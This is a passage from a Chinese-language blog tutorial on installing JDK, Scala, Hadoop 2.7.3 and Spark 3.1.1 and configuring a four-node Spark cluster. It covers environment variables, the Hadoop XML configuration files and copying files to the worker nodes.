class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、环境安装配置（在-spark0-上操作）"><a href="#三、环境安装配置（在-spark0-上操作）" class="headerlink" title="三、环境安装配置（在 spark0 上操作）"></a>三、环境安装配置（在 spark0 上操作）</h2><h3 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h3><ol><li>Downlaod JDK</li></ol><p>下载地址：<a href="https://www.yuque.com/attachments/yuque/0/2021/zip/519483/1616420001017-86504c38-9976-4947-857a-ab4d9d2d0028.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/zip/519483/1616420001017-86504c38-9976-4947-857a-ab4d9d2d0028.zip%22,%22name%22:%22jdk-8u281-linux-x64.tar.gz.zip%22,%22size%22:143049315,%22type%22:%22%22,%22ext%22:%22zip%22,%22status%22:%22done%22,%22source%22:%22transfer%22,%22id%22:%22ZVZP4%22,%22card%22:%22file%22%7D">jdk-8u281-linux-x64.tar.gz.zip</a></p><ol start="2"><li>解压 JDK​</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf jdk-8u281-linux-x64.tar.gz -C /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>配置环境变量</li></ol><p>编辑**/etc/profile**，添加如下内容：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> JAVA_HOME<span class="token operator">=</span>/opt/jdk1.8.0_281<span class="token function">export</span> JRE_HOME<span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/jre<span class="token function">export</span> CLASSPATH<span class="token operator">=</span>.:<span class="token variable">$JAVA_HOME</span>/lib:<span class="token variable">$JRE_HOME</span>/lib:<span class="token variable">$CLASSPATH</span><span class="token function">export</span> JAVA_PATH<span class="token operator">=</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token variable">$JRE_HOME</span>/bin<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$JAVA_PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更新文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试</p><pre class="line-numbers language-bash"><code class="language-bash">java -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Scala"><a href="#Scala" class="headerlink" title="Scala"></a>Scala</h3><ol><li>下载 Scala</li></ol><p>下载地址：<a href="https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001231-2b0fa938-a732-4e2b-8037-8a4ca2a03fab.gz?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001231-2b0fa938-a732-4e2b-8037-8a4ca2a03fab.gz%22,%22name%22:%22scala-2.13.5.gz%22,%22size%22:23042641,%22type%22:%22%22,%22ext%22:%22gz%22,%22status%22:%22done%22,%22source%22:%22transfer%22,%22id%22:%22S2Ol0%22,%22card%22:%22file%22%7D">scala-2.13.5.gz</a></p><ol start="2"><li>解压</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf scala-2.13.5.tgz -C /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>配置环境变量</li></ol><p>编辑**/etc/profile**，添加如下内容：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> SCALA_HOME<span class="token operator">=</span>/opt/scala-2.13.5<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$SCALA_HOME</span>/bin:<span class="token variable">$PATH</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>更新文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试</p><pre class="line-numbers language-bash"><code class="language-bash">scala -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h3><ol><li>下载 Hadoop</li></ol><p>下载地址：<a href="https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001410-cb5bfab5-e3b7-4941-9295-aa45770a6dc7.gz?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001410-cb5bfab5-e3b7-4941-9295-aa45770a6dc7.gz%22,%22name%22:%22hadoop-2.7.3.tar.gz%22,%22size%22:214092195,%22type%22:%22%22,%22ext%22:%22gz%22,%22status%22:%22done%22,%22source%22:%22transfer%22,%22id%22:%22tL82Q%22,%22card%22:%22file%22%7D">hadoop-2.7.3.tar.gz</a></p><ol start="2"><li>解压</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf hadoop-2.7.3.tgz.gz -C /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>配置环境变量</li></ol><p>编辑**/etc/profile**，添加如下内容：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> HADOOP_HOME<span class="token operator">=</span>/opt/hadoop-2.7.3<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$HADOOP_HOME</span>/bin:<span class="token variable">$HADOOP_HOME</span>/sbin:<span class="token variable">$PATH</span><span class="token function">export</span> HADOOP_CONF_DIR<span class="token operator">=</span><span class="token variable">$HADOOP_HOME</span>/etc/hadoop<span class="token function">export</span> YARN_CONF_DIR<span class="token operator">=</span><span class="token variable">$HADOOP_HOME</span>/etc/hadoop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>添加文件夹</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token variable">$HADOOP_HOME</span>/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>修改**$HADOOP_HOME/etc/hadoop/slaves**为：</li></ol><pre class="line-numbers language-scala"><code class="language-scala">spark1spark2spark3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="5"><li>修改**$HADOOP_HOME/etc/hadoop/core-site.xml**为：</li></ol><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hadoop.tmp.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>file:/opt/hadoop-2.7.3/tmp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>Abase for other temporary directories.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>fs.defaultFS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hdfs://spark0:9000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>io.file.buffer.size<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>131072<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>修改**$HADOOP_HOME/etc/hadoop/hdfs-site.xml**为：</li></ol><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.http.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:50070<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>The address and the base port where the dfs namenode web ui will listen on.If the port is 0 then the server will start on a free port.    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.secondary.http-address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:50090<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.namenode.name.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/opt/hadoop-2.7.3/hdfs/name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.datanode.data.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/opt/hadoop-2.7.3/hdfs/data<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.replication<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.webhdfs.enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="7"><li>修改**$HADOOP_HOME/etc/hadoop/yarn-site.xml**为：</li></ol><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- Site specific YARN configuration properties --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.hostname<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.aux-services<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>mapreduce_shuffle<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8032<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.scheduler.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8030<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.resource-tracker.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8031<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.admin.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8033<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.webapp.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:8088<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li>修改**$HADOOP_HOME/etc/hadoop/mapred-site.xml**为：</li></ol><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token comment" spellcheck="true">&lt;!-- Put site-specific property overrides in this file. --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.framework.name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>yarn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>final</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>final</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.jobtracker.http.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:50030<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.jobhistory.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:10020<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapreduce.jobhistory.webapp.address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>spark0:19888<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>mapred.job.tracker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>http://spark0:9001<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="9"><li>修改**$HADOOP_HOME/etc/hadoop/hadoop-env.sh<strong>的</strong>JAVA_HOME**</li></ol><pre class="line-numbers language-xml"><code class="language-xml">export JAVA_HOME=/opt/jdk1.8.0_281<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="10"><li>格式化 <strong>namenode</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">hadoop namenode -format<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>出现 Exitting with status 0 表示成功，若为 Exitting with status 1 则是出错</p></blockquote><h3 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h3><ol><li>下载 Spark</li></ol><p>下载地址：<a href="https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001613-e62f9c8f-59ed-4910-b181-7904152d962d.gz?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2021/gz/519483/1616420001613-e62f9c8f-59ed-4910-b181-7904152d962d.gz%22,%22name%22:%22spark-3.1.1-bin-hadoop2.7.gz%22,%22size%22:224374704,%22type%22:%22%22,%22ext%22:%22gz%22,%22status%22:%22done%22,%22source%22:%22transfer%22,%22id%22:%22ypySx%22,%22card%22:%22file%22%7D">spark-3.1.1-bin-hadoop2.7.gz</a></p><ol start="2"><li>解压</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -zxvf spark-3.1.1-bin-hadoop2.7.tgz -C /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>配置环境变量</li></ol><p>编辑**/etc/profile**，添加如下内容：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> SPARK_HOME<span class="token operator">=</span>/opt/spark-3.1.1-bin-hadoop2.7<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$SPARK_HOME</span>/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>更新文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>配置<strong>spark-env.sh</strong>文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /opt/spark-3.1.1-bin-hadoop2.7/conf<span class="token function">cp</span> spark-env.sh.template spark-env.shvim spark-env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>添加以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">export</span> JAVA_HOME<span class="token operator">=</span>/opt/jdk1.8.0_281<span class="token function">export</span> HADOOP_HOME<span class="token operator">=</span>/opt/hadoop-2.7.3<span class="token function">export</span> SCALA_HOME<span class="token operator">=</span>/opt/scala-2.13.5<span class="token function">export</span> SPARK_MASTER_IP<span class="token operator">=</span>spark0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>配置<strong>workers</strong>文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /opt/spark-3.1.1-bin-hadoop2.7/conf<span class="token function">cp</span> workers.template workersvim workers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>添加以下内容：</p><pre class="line-numbers language-bash"><code class="language-bash">spark0spark1spark2spark3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、Spark1-3-配置"><a href="#四、Spark1-3-配置" class="headerlink" title="四、Spark1-3 配置"></a>四、Spark1-3 配置</h2><h3 id="文件拷贝（在-Spark0-上操作）"><a href="#文件拷贝（在-Spark0-上操作）" class="headerlink" title="文件拷贝（在 Spark0 上操作）"></a>文件拷贝（在 Spark0 上操作）</h3><ol><li>拷贝**/opt/**目录</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">scp</span> -r /opt/ root@spark1:/<span class="token function">scp</span> -r /opt/ root@spark2:/<span class="token function">scp</span> -r /opt/ root@spark3:/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>拷贝**/etc/profile**文件</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">scp</span> /etc/profile root@spark1:/etc/<span class="token function">scp</span> /etc/profile root@spark2:/etc/<span class="token function">scp</span> /etc/profile root@spark3:/etc/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="修改-SPARK-LOCAL-IP（在-spark1-3-上操作）"><a href="#修改-SPARK-LOCAL-IP（在-spark1-3-上操作）" class="headerlink" title="修改 SPARK_LOCAL_IP（在 spark1-3 上操作）"></a>修改 SPARK_LOCAL_IP（在 spark1-3 上操作）</h3><ol><li>刷新**/etc/profile**</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>改<strong>SPARK_LOCAL_IP</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">vim <span class="token variable">$SPARK_HOME</span>/conf/spark-env.sh<span class="token comment" spellcheck="true"># 把最后一行的spark0分别修改为spark1、spark2、spark3</span><span class="token function">export</span> SPARK_MASTER_HOST<span class="token operator">=</span>spark1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、启动-停止集群"><a href="#五、启动-停止集群" class="headerlink" 